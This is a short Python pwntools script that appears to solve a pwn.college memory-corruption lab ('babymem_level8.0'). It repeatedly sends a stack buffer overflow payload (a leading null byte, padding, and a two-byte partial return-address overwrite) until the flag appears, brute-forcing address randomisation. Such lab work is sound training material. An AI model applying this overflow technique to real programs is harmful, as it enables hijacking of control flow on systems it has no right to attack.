from pwn import *

while True:
    p = process('/challenge/babymem_level8.0')

    p.recvuntil('Payload size:')
    p.sendline(b'154')

    payload = b'\x00' + b'a' * 151 + p16(0x4f21) 

    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break

